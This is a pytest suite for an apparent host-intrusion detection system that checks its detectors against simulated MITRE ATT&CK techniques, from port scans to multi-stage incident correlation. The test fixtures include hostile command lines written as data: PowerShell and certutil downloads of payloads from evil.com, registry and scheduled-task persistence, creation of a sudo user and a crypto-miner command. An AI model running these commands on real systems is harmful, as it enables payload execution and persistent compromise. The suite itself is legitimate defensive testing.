"""
Project AEGIS -- Phase 5: Adversarial Testing Suite
Lead Architect: ETCHERO / Abdul-Hameed
Version: 1.0.0 | Classification: AEGIS-ADVERSARIAL

Simulates realistic attack techniques inspired by MITRE ATT&CK, Metasploit,
and Atomic Red Team TTPs. Feeds attacks through every AEGIS detection module
and measures the detection rate.

Attack scenarios (by MITRE tactic):
  1. Reconnaissance       -- SYN, FIN, XMAS, NULL, UDP scans (T1595)
  2. Credential Access    -- SSH brute force (T1110)
  3. Execution            -- Reverse shell, suspicious PowerShell (T1059)
  4. Persistence          -- Registry run key, scheduled task (T1547)
  5. Privilege Escalation -- sudo, runas (T1068)
  6. Defense Evasion      -- DLL injection, process hollowing (T1055)
  7. Command & Control    -- DNS tunneling, beaconing (T1071, T1572)
  8. Exfiltration         -- Large DNS TXT responses (T1048)
  9. Impact               -- File tampering, crypto miner (T1485, T1496)
"""

import os
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

import pytest

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))


@pytest.fixture(scope="module")
def detection_results() -> Dict[str, bool]:
    """Shared detection results dictionary across all scenarios."""
    return {}


class TestAdversarial:
    """Adversarial attack scenario tests."""

    # ═══════════════════════════════════════════════════════════════════════════
    # SCENARIO 1: RECONNAISSANCE (T1595: Active Scanning)
    # ═══════════════════════════════════════════════════════════════════════════

    def test_t1595_syn_scan_detected(self):
        """SYN scan (Nmap -sS) should be detected."""
        from modules.net_sentinel import _check_tcp_flags

        class MockPkt:
            def __init__(self, tcp_flags=0x02):
                self._flags = tcp_flags
            def haslayer(self, layer):
                return 'TCP' in str(layer) or 'IP' in str(layer)
            def __getitem__(self, layer):
                name = str(layer if isinstance(layer, str) else layer.__name__)
                if 'IP' in name:
                    return type('o', (object,), {'src': '10.0.0.5'})()
                if 'TCP' in name:
                    return type('o', (object,), {'flags': self._flags, 'dport': 80, 'sport': 54321})()
                raise KeyError(layer)

        pkt = MockPkt(tcp_flags=0x02)
        assert _check_tcp_flags(pkt) == "SYN_SCAN"

    def test_t1595_fin_scan_detected(self):
        """FIN scan (Nmap -sF) should be detected."""
        from modules.net_sentinel import _check_tcp_flags

        class MockPkt:
            def __init__(self, tcp_flags=0x01):
                self._flags = tcp_flags
            def haslayer(self, layer):
                return 'TCP' in str(layer) or 'IP' in str(layer)
            def __getitem__(self, layer):
                name = str(layer if isinstance(layer, str) else layer.__name__)
                if 'IP' in name:
                    return type('o', (object,), {'src': '10.0.0.5'})()
                if 'TCP' in name:
                    return type('o', (object,), {'flags': self._flags, 'dport': 80, 'sport': 54321})()
                raise KeyError(layer)

        assert _check_tcp_flags(MockPkt(tcp_flags=0x01)) == "FIN_SCAN"

    def test_t1595_xmas_scan_detected(self):
        """XMAS scan (Nmap -sX: FIN+PSH+URG) should be detected."""
        from modules.net_sentinel import _check_tcp_flags

        class MockPkt:
            def __init__(self, tcp_flags=0x29):
                self._flags = tcp_flags
            def haslayer(self, layer):
                return 'TCP' in str(layer) or 'IP' in str(layer)
            def __getitem__(self, layer):
                name = str(layer if isinstance(layer, str) else layer.__name__)
                if 'IP' in name:
                    return type('o', (object,), {'src': '10.0.0.5'})()
                if 'TCP' in name:
                    return type('o', (object,), {'flags': self._flags, 'dport': 80, 'sport': 54321})()
                raise KeyError(layer)

        assert _check_tcp_flags(MockPkt(tcp_flags=0x29)) == "XMAS_SCAN"

    def test_t1595_null_scan_detected(self):
        """NULL scan (Nmap -sN: no flags) should be detected."""
        from modules.net_sentinel import _check_tcp_flags

        class MockPkt:
            def __init__(self, tcp_flags=0x00):
                self._flags = tcp_flags
            def haslayer(self, layer):
                return 'TCP' in str(layer) or 'IP' in str(layer)
            def __getitem__(self, layer):
                name = str(layer if isinstance(layer, str) else layer.__name__)
                if 'IP' in name:
                    return type('o', (object,), {'src': '10.0.0.5'})()
                if 'TCP' in name:
                    return type('o', (object,), {'flags': self._flags, 'dport': 80, 'sport': 54321})()
                raise KeyError(layer)

        assert _check_tcp_flags(MockPkt(tcp_flags=0x00)) == "NULL_SCAN"

    def test_t1595_synack_not_flagged(self):
        """SYN-ACK should NOT be flagged as a scan (false positive prevention)."""
        from modules.net_sentinel import _check_tcp_flags

        class MockPkt:
            def __init__(self, tcp_flags=0x12):
                self._flags = tcp_flags
            def haslayer(self, layer):
                return 'TCP' in str(layer) or 'IP' in str(layer)
            def __getitem__(self, layer):
                name = str(layer if isinstance(layer, str) else layer.__name__)
                if 'IP' in name:
                    return type('o', (object,), {'src': '10.0.0.5'})()
                if 'TCP' in name:
                    return type('o', (object,), {'flags': self._flags, 'dport': 80, 'sport': 54321})()
                raise KeyError(layer)

        assert _check_tcp_flags(MockPkt(tcp_flags=0x12)) is None

    def test_t1595_reasoning_critical(self):
        """60-port scan should be evaluated as CRITICAL."""
        from modules.net_sentinel import SentinelReasoning
        level, _, action = SentinelReasoning.evaluate("10.0.0.5", list(range(60)), "SYN_SCAN")
        assert level == "CRITICAL"
        assert action == "FLAG_FOR_AUTOBLOCK"

    def test_t1595_reasoning_high(self):
        """30-port scan should be evaluated as HIGH."""
        from modules.net_sentinel import SentinelReasoning
        level, _, action = SentinelReasoning.evaluate("10.0.0.5", list(range(30)), "SYN_SCAN")
        assert level == "HIGH"
        assert action == "ALERT_AND_MONITOR"

    def test_t1595_reasoning_low(self):
        """2-port probe should be evaluated as LOW."""
        from modules.net_sentinel import SentinelReasoning
        level, _, action = SentinelReasoning.evaluate("10.0.0.5", [22, 80], "SYN_SCAN")
        assert level == "LOW"
        assert action == "PASSIVE_LOG"

    # ═══════════════════════════════════════════════════════════════════════════
    # SCENARIO 2: CREDENTIAL ACCESS (T1110: Brute Force)
    # ═══════════════════════════════════════════════════════════════════════════

    def test_t1110_brute_force_detected(self):
        """15 failed logins from same IP should trigger brute force."""
        from modules.login_monitor import LoginReasoningEngine, LoginAttempt
        engine = LoginReasoningEngine()
        now = time.time()
        attempts = [
            LoginAttempt(timestamp=now - (i * 1.5), username=f"user{i%5}",
                         source_ip="192.168.1.100", success=False,
                         log_line=f"Failed password for user{i%5}")
            for i in range(15)
        ]
        threats = engine.evaluate(attempts)
        brute = [t for t in threats if t.threat_type == "BRUTE_FORCE"]
        assert len(brute) > 0

    def test_t1110_brute_force_risk_critical(self):
        """15 failed logins should have CRITICAL or HIGH risk."""
        from modules.login_monitor import LoginReasoningEngine, LoginAttempt
        engine = LoginReasoningEngine()
        now = time.time()
        attempts = [
            LoginAttempt(timestamp=now - (i * 1.5), username=f"user{i%5}",
                         source_ip="192.168.1.100", success=False,
                         log_line=f"Failed password for user{i%5}")
            for i in range(15)
        ]
        threats = engine.evaluate(attempts)
        brute = [t for t in threats if t.threat_type == "BRUTE_FORCE"]
        if brute:
            assert brute[0].risk_level in ("CRITICAL", "HIGH")

    def test_t1110_brute_force_action_block(self):
        """Brute force should recommend FLAG_FOR_AUTOBLOCK."""
        from modules.login_monitor import LoginReasoningEngine, LoginAttempt
        engine = LoginReasoningEngine()
        now = time.time()
        attempts = [
            LoginAttempt(timestamp=now - (i * 1.5), username="root",
                         source_ip="192.168.1.100", success=False,
                         log_line=f"Failed password for root")
            for i in range(15)
        ]
        threats = engine.evaluate(attempts)
        brute = [t for t in threats if t.threat_type == "BRUTE_FORCE"]
        if brute:
            assert brute[0].action_taken == "FLAG_FOR_AUTOBLOCK"

    def test_t1110_second_ip_tracked_separately(self):
        """Second attacker IP should be tracked independently."""
        from modules.login_monitor import LoginReasoningEngine, LoginAttempt
        engine = LoginReasoningEngine()
        now = time.time()
        for i in range(10):
            engine.evaluate([
                LoginAttempt(timestamp=now - (i * 2), username="root",
                             source_ip="10.0.0.99", success=False,
                             log_line=f"Failed password for root from 10.0.0.99")
            ])
        threats = engine._check_attempt(
            LoginAttempt(timestamp=now, username="root",
                         source_ip="10.0.0.99", success=False,
                         log_line="Failed password for root"), now)
        # May be on cooldown, but IP should be tracked
        assert "10.0.0.99" in engine._failed_attempts

    def test_t1110_successful_login_not_flagged(self):
        """Successful logins should not trigger brute force."""
        from modules.login_monitor import LoginReasoningEngine, LoginAttempt
        engine = LoginReasoningEngine()
        now = time.time()
        attempts = [
            LoginAttempt(timestamp=now - i, username="alice",
                         source_ip="192.168.1.50", success=True,
                         log_line="Accepted password for alice")
            for i in range(5)
        ]
        threats = engine.evaluate(attempts)
        brute = [t for t in threats if t.threat_type == "BRUTE_FORCE"]
        assert len(brute) == 0

    # ═══════════════════════════════════════════════════════════════════════════
    # SCENARIO 3: EXECUTION (T1059: Command & Scripting Interpreter)
    # ═══════════════════════════════════════════════════════════════════════════

    def test_t1059_encoded_powershell_detected(self):
        """Base64-encoded PowerShell command should be detected."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        result = engine._check_suspicious_cmdline(1234, {
            "name": "powershell.exe",
            "cmdline": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgA",
            "parent_name": "explorer.exe", "parent_pid": 888, "username": "admin",
            "cpu_percent": 5.0, "num_connections": 0, "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "cwd": "C:\\Users\\admin",
        })
        assert result is not None
        assert result.threat_type == "SUSPICIOUS_CMDLINE"

    def test_t1059_remote_download_detected(self):
        """IEX remote download pattern should be detected."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        result = engine._check_suspicious_cmdline(5678, {
            "name": "powershell.exe",
            "cmdline": "powershell iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
            "parent_name": "explorer.exe", "parent_pid": 888, "username": "admin",
            "cpu_percent": 2.0, "num_connections": 0,
            "exe": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "cwd": "C:\\Users\\admin",
        })
        assert result is not None
        assert result.threat_type == "SUSPICIOUS_CMDLINE"

    def test_t1059_lolbin_certutil_detected(self):
        """LOLBin certutil with URL download should be detected."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        result = engine._check_suspicious_cmdline(4321, {
            "name": "certutil.exe",
            "cmdline": "certutil -urlcache -split -f http://evil.com/payload.exe C:\\Users\\Public\\payload.exe",
            "parent_name": "cmd.exe", "parent_pid": 432, "username": "admin",
            "cpu_percent": 2.0, "num_connections": 0,
            "exe": "C:\\Windows\\System32\\certutil.exe",
            "cwd": "C:\\Windows\\System32",
        })
        assert result is not None
        assert result.threat_type == "SUSPICIOUS_CMDLINE"

    def test_t1059_suspicious_chain_word_to_powershell(self):
        """Word.exe spawning PowerShell should be flagged as suspicious chain."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        result = engine._check_suspicious_chain(999, {
            "name": "powershell.exe", "parent_name": "word.exe", "parent_pid": 111,
        })
        assert result is not None
        assert result.threat_type == "SUSPICIOUS_CHAIN"

    def test_t1059_normal_chain_not_flagged(self):
        """Explorer -> PowerShell chain should NOT be flagged (FP prevention)."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        result = engine._check_suspicious_chain(1000, {
            "name": "powershell.exe", "parent_name": "explorer.exe", "parent_pid": 222,
        })
        assert result is None

    # ═══════════════════════════════════════════════════════════════════════════
    # SCENARIO 4: PERSISTENCE (T1547: Boot/Logon Autostart)
    # ═══════════════════════════════════════════════════════════════════════════

    def test_t1547_registry_run_key_detected(self):
        """Registry Run key creation should be detected as persistence."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        result = engine._check_persistence(4444, {
            "name": "reg.exe",
            "cmdline": 'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "C:\\Users\\Public\\updater.exe" /f',
            "parent_name": "cmd.exe", "parent_pid": 432, "username": "admin",
            "cpu_percent": 1.0, "num_connections": 0,
            "exe": "C:\\Windows\\System32\\reg.exe", "cwd": "C:\\Windows\\System32",
        })
        assert result is not None
        assert result.threat_type == "PERSISTENCE"

    def test_t1547_scheduled_task_detected(self):
        """Scheduled task creation should be detected as persistence."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        result = engine._check_persistence(5555, {
            "name": "schtasks.exe",
            "cmdline": 'schtasks /create /tn "WindowsUpdate" /tr "C:\\Users\\Public\\beacon.exe" /sc hourly',
            "parent_name": "cmd.exe", "parent_pid": 432, "username": "admin",
            "cpu_percent": 1.0, "num_connections": 0,
            "exe": "C:\\Windows\\System32\\schtasks.exe", "cwd": "C:\\Windows\\System32",
        })
        assert result is not None
        assert result.threat_type == "PERSISTENCE"

    def test_t1547_normal_not_flagged(self):
        """Normal process should not be flagged as persistence."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        result = engine._check_persistence(6666, {
            "name": "notepad.exe", "cmdline": "notepad readme.txt",
            "parent_name": "explorer.exe", "parent_pid": 888, "username": "admin",
            "cpu_percent": 0.5, "num_connections": 0,
            "exe": "C:\\Windows\\System32\\notepad.exe", "cwd": "C:\\Users\\admin",
        })
        assert result is None

    # ═══════════════════════════════════════════════════════════════════════════
    # SCENARIO 5: PRIVILEGE ESCALATION (T1068)
    # ═══════════════════════════════════════════════════════════════════════════

    def test_t1068_sudo_detected(self):
        """sudo command should be detected as privilege escalation."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        result = engine._check_privilege_escalation(7777, {
            "name": "bash", "cmdline": "sudo useradd -G sudo attacker",
            "parent_name": "ssh", "parent_pid": 777, "username": "user",
            "cpu_percent": 1.0, "num_connections": 0, "exe": "/bin/bash", "cwd": "/home/user",
        })
        assert result is not None
        assert result.threat_type == "PRIVILEGE_ESC"

    def test_t1068_runas_detected(self):
        """runas command should be detected as privilege escalation."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        result = engine._check_privilege_escalation(8888, {
            "name": "cmd.exe", "cmdline": "runas /user:Administrator cmd.exe",
            "parent_name": "explorer.exe", "parent_pid": 888, "username": "user",
            "cpu_percent": 1.0, "num_connections": 0,
            "exe": "C:\\Windows\\System32\\cmd.exe", "cwd": "C:\\Users\\user",
        })
        assert result is not None
        assert result.threat_type == "PRIVILEGE_ESC"

    def test_t1068_normal_not_flagged(self):
        """Normal process should not be flagged as privilege escalation."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        result = engine._check_privilege_escalation(9999, {
            "name": "notepad.exe", "cmdline": "notepad readme.txt",
            "parent_name": "explorer.exe", "parent_pid": 888, "username": "admin",
            "cpu_percent": 0.5, "num_connections": 0,
            "exe": "C:\\Windows\\System32\\notepad.exe", "cwd": "C:\\Users\\admin",
        })
        assert result is None

    # ═══════════════════════════════════════════════════════════════════════════
    # SCENARIO 6: COMMAND & CONTROL (T1071/T1572)
    # ═══════════════════════════════════════════════════════════════════════════

    def test_t1071_dga_high_entropy(self):
        """DGA domain should have high Shannon entropy."""
        from modules.dns_monitor import EntropyCalculator
        entropy = EntropyCalculator.domain_entropy(
            "x8fK2pQ9mZ1vR3nL5sW7yB4.dga-malware.example.com"
        )
        assert entropy > 3.0

    def test_t1071_normal_domain_low_entropy(self):
        """Normal domain should have low entropy."""
        from modules.dns_monitor import EntropyCalculator
        entropy = EntropyCalculator.shannon_entropy("google")
        assert entropy < 3.0

    def test_t1071_empty_entropy_zero(self):
        """Empty string should have zero entropy."""
        from modules.dns_monitor import EntropyCalculator
        assert EntropyCalculator.shannon_entropy("") == 0.0

    def test_t1071_dns_queries_tracked(self):
        """DNS tunneling queries should be tracked per domain."""
        from modules.dns_monitor import DnsReasoningEngine, DnsQuery
        engine = DnsReasoningEngine()
        for i in range(10):
            engine.evaluate(DnsQuery(
                timestamp=time.time() + (i * 0.3),
                domain=f"data{i:04d}.exfil.evil-c2.com",
                query_type="TXT", source_ip="1.2.3.4",
                query_size=60, response_size=1200 + (i * 50),
            ))
        tracked = any("evil-c2.com" in d for d in engine._domain_tracker)
        assert tracked

    def test_t1071_large_response_detected(self):
        """Large DNS response should be flagged."""
        from modules.dns_monitor import DnsReasoningEngine, DnsQuery
        engine = DnsReasoningEngine()
        threat = engine.evaluate(DnsQuery(
            timestamp=time.time(), domain="exfil.example.com",
            query_type="A", source_ip="1.2.3.4",
            query_size=50, response_size=5000,
        ))
        if threat is not None:
            assert threat.threat_type in ("LARGE_RESPONSE",)

    # ═══════════════════════════════════════════════════════════════════════════
    # SCENARIO 7: DEFENSE EVASION (T1055: Process Injection)
    # ═══════════════════════════════════════════════════════════════════════════

    def test_t1055_rwx_memory_detected(self):
        """RWX memory regions should be flagged as suspicious."""
        from modules.memory_monitor import MemoryRegion, SUSPICIOUS_PERMISSIONS
        regions = [
            MemoryRegion(path="", perms="rwx", rss=65536,
                         is_anonymous=True, is_executable=True, is_writable=True, is_private=True),
            MemoryRegion(path="", perms="rwxp", rss=131072,
                         is_anonymous=True, is_executable=True, is_writable=True, is_private=True),
            MemoryRegion(path="/usr/lib/libc.so", perms="r-x", rss=4096,
                         is_anonymous=False, is_executable=True, is_writable=False, is_private=True),
        ]
        suspicious = sum(1 for r in regions if r.perms in SUSPICIOUS_PERMISSIONS)
        assert suspicious >= 2

    def test_t1055_dll_injection_threat_created(self):
        """DLL injection MemoryThreat should be creatable."""
        from modules.memory_monitor import MemoryThreat
        from datetime import datetime
        threat = MemoryThreat(
            timestamp=datetime.now().isoformat(), pid=5678,
            process_name="svchost.exe", risk_level="HIGH",
            threat_type="DLL_INJECTION", suspicious_count=3,
            reasoning="DLL injection detected: 3 suspicious modules",
            action_taken="ALERT_AND_MONITOR",
            evidence={"suspicious_modules": ["evil.dll"]},
        )
        assert threat is not None
        assert threat.threat_type == "DLL_INJECTION"

    def test_t1055_process_hollowing_detected(self):
        """Process hollowing via temp executable should be detected."""
        from modules.memory_monitor import MemoryAnalyzer, MemoryRegion
        analyzer = MemoryAnalyzer()
        regions = [
            MemoryRegion(path="C:\\Users\\Public\\Temp\\svchost.exe", perms="rwx", rss=262144,
                         is_anonymous=True, is_executable=True, is_writable=True, is_private=True),
        ]
        result = analyzer._check_hollowing(regions, process_name="svchost.exe")
        assert result is not None
        assert "temp" in result.get("indicator", "").lower()

    def test_t1055_reflective_loading_threat_created(self):
        """Reflective loading MemoryThreat should be creatable."""
        from modules.memory_monitor import MemoryThreat
        from datetime import datetime
        threat = MemoryThreat(
            timestamp=datetime.now().isoformat(), pid=1234,
            process_name="svchost.exe", risk_level="HIGH",
            threat_type="REFLECTIVE_LOAD", suspicious_count=2,
            reasoning="Reflective DLL loading suspected in 'svchost.exe': 2 anonymous executable regions",
            action_taken="ALERT_AND_MONITOR",
            evidence={"anon_exec_count": 2},
        )
        assert threat is not None
        assert threat.threat_type == "REFLECTIVE_LOAD"

    # ═══════════════════════════════════════════════════════════════════════════
    # SCENARIO 8: IMPACT (T1485: Data Destruction / T1496: Resource Hijacking)
    # ═══════════════════════════════════════════════════════════════════════════

    def test_t1485_file_tamper_threat_created(self):
        """File tampering FileThreat should be creatable."""
        from modules.file_monitor import FileThreat
        from datetime import datetime
        threat = FileThreat(
            timestamp=datetime.now().isoformat(),
            threat_type="FILE_CHANGED", risk_level="CRITICAL",
            file_path="/etc/shadow",
            old_hash="e5c6f7a8b9c0d1e2f3a4b5c6d7e8f9a0",
            new_hash="a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6",
            old_size=1024, new_size=2048,
            reasoning="Critical system file modified: /etc/shadow",
            action_taken="FLAG_FOR_AUTOBLOCK",
            evidence={"file_path": "/etc/shadow"},
        )
        assert threat is not None
        assert threat.threat_type == "FILE_CHANGED"
        assert threat.risk_level == "CRITICAL"

    def test_t1496_crypto_miner_detected(self):
        """Sustained high CPU should be detected as crypto miner."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        engine._cpu_history[8888] = [95.0, 96.0, 94.0, 97.0, 93.0]
        result = engine._check_crypto_miner(8888, {
            "name": "xmrig.exe", "cpu_percent": 95.0,
            "cmdline": "xmrig.exe --algo=rx/0 --url=pool.minexmr.com:443",
            "parent_name": "cmd.exe", "parent_pid": 432, "username": "admin",
        })
        assert result is not None
        assert result.threat_type == "CRYPTO_MINER"

    def test_t1496_normal_cpu_not_flagged(self):
        """Normal CPU usage should NOT be flagged as miner."""
        from modules.process_monitor import ProcessReasoningEngine
        engine = ProcessReasoningEngine()
        engine._cpu_history[9999] = [5.0, 6.0, 4.0]
        result = engine._check_crypto_miner(9999, {
            "name": "notepad.exe", "cpu_percent": 5.0,
            "cmdline": "notepad readme.txt",
            "parent_name": "explorer.exe", "parent_pid": 888, "username": "admin",
        })
        assert result is None

    # ═══════════════════════════════════════════════════════════════════════════
    # SCENARIO 9: MULTI-STAGE ATTACK (Full Kill Chain)
    # ═══════════════════════════════════════════════════════════════════════════

    def test_multi_stage_correlation(self):
        """Multi-stage attack should correlate into single incident."""
        from modules.incident_manager import IncidentManager
        from dataclasses import dataclass

        @dataclass
        class StageThreat:
            attacker_ip: str = ""
            threat_type: str = ""
            risk_level: str = "LOW"
            reasoning: str = ""

        im = IncidentManager()
        im.start()

        inc1 = im.correlate(StageThreat(attacker_ip="10.0.0.5", threat_type="SYN_SCAN",
                                        risk_level="MEDIUM", reasoning="Port scan"))
        inc2 = im.correlate(StageThreat(attacker_ip="10.0.0.5", threat_type="BRUTE_FORCE",
                                        risk_level="HIGH", reasoning="15 failed logins"))
        inc3 = im.correlate(StageThreat(attacker_ip="10.0.0.5", threat_type="REVERSE_SHELL",
                                        risk_level="CRITICAL", reasoning="Reverse shell"))
        inc4 = im.correlate(StageThreat(attacker_ip="10.0.0.5", threat_type="PERSISTENCE",
                                        risk_level="HIGH", reasoning="Registry persistence"))

        if inc4:
            types = inc4.threat_types
            assert "SYN_SCAN" in types
            assert "BRUTE_FORCE" in types
            assert "REVERSE_SHELL" in types
            assert "PERSISTENCE" in types
            assert inc4.risk_level == "CRITICAL"
            assert inc4.event_count >= 4

        im.stop()

    # ═══════════════════════════════════════════════════════════════════════════
    # SCENARIO 10: AI ANALYST ASSESSMENT
    # ═══════════════════════════════════════════════════════════════════════════

    def test_ai_assessment_multi_stage(self):
        """AI Analyst should assess multi-stage attack with MITRE mappings."""
        from modules.ai_analyst import AiAnalyst
        from modules.incident_manager import Incident, IncidentEvent
        from datetime import datetime

        now_ts = datetime.now().isoformat()
        incident = Incident(
            incident_id="AEGIS-ADV-0001", created_at=now_ts, updated_at=now_ts,
            status="OPEN", risk_level="CRITICAL",
            threat_types=["SYN_SCAN", "BRUTE_FORCE", "REVERSE_SHELL", "PERSISTENCE"],
            source_ips={"10.0.0.5"}, process_names={"powershell.exe", "cmd.exe"},
            event_count=4, last_event_time=time.time(),
        )
        incident.events = [
            IncidentEvent(timestamp=now_ts, threat_type="SYN_SCAN", risk_level="MEDIUM",
                          source="network", summary="Port scan from 10.0.0.5",
                          detail="Nmap SYN scan on 25 ports"),
            IncidentEvent(timestamp=now_ts, threat_type="BRUTE_FORCE", risk_level="HIGH",
                          source="login", summary="SSH brute force from 10.0.0.5",
                          detail="15 failed login attempts"),
            IncidentEvent(timestamp=now_ts, threat_type="REVERSE_SHELL", risk_level="CRITICAL",
                          source="process", summary="Reverse shell from powershell.exe",
                          detail="Outbound connection to 10.0.0.5:443"),
            IncidentEvent(timestamp=now_ts, threat_type="PERSISTENCE", risk_level="HIGH",
                          source="process", summary="Registry Run key persistence",
                          detail="reg.exe added HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"),
        ]

        assessment = AiAnalyst.analyze_incident(incident)
        assert assessment is not None
        assert assessment.incident_id == "AEGIS-ADV-0001"
        assert assessment.risk_level == "CRITICAL"
        assert len(assessment.mitre_techniques) > 0
        assert len(assessment.kill_chain) > 0
        assert len(assessment.recommended_actions) > 0
        assert len(assessment.key_indicators) > 0
        assert bool(assessment.executive_summary)
        assert bool(assessment.narrative)

        tech_ids = {t.technique_id for t in assessment.mitre_techniques}
        assert any(t.startswith("T1595") for t in tech_ids), f"No reconnaissance technique in {tech_ids}"
        assert any(t.startswith("T1110") for t in tech_ids), f"No brute force technique in {tech_ids}"
        assert any(t.startswith("T1059") for t in tech_ids), f"No execution technique in {tech_ids}"

    def test_ai_assessment_mapping_coverage(self):
        """All threat types should have MITRE ATT&CK mappings."""
        from modules.ai_analyst import MITRE_MAPPING
        expected = {
            "SYN_SCAN", "FIN_SCAN", "XMAS_SCAN", "NULL_SCAN", "UDP_SCAN",
            "REVERSE_SHELL", "SUSPICIOUS_CMDLINE", "CRYPTO_MINER",
            "PRIVILEGE_ESC", "PERSISTENCE", "SUSPICIOUS_CHAIN",
            "RWX_MEMORY", "DLL_INJECTION", "REFLECTIVE_LOAD",
            "PROCESS_HOLLOWING", "HIGH_MAP_COUNT",
            "DNS_TUNNEL", "HIGH_ENTROPY", "BEACONING", "TXT_ABUSE", "LARGE_RESPONSE",
            "BRUTE_FORCE", "NEW_ADMIN", "SUSPICIOUS_LOGIN",
            "FILE_CHANGED", "FILE_DELETED",
        }
        missing = expected - set(MITRE_MAPPING.keys())
        assert len(missing) == 0, f"Missing MITRE mappings: {missing}"
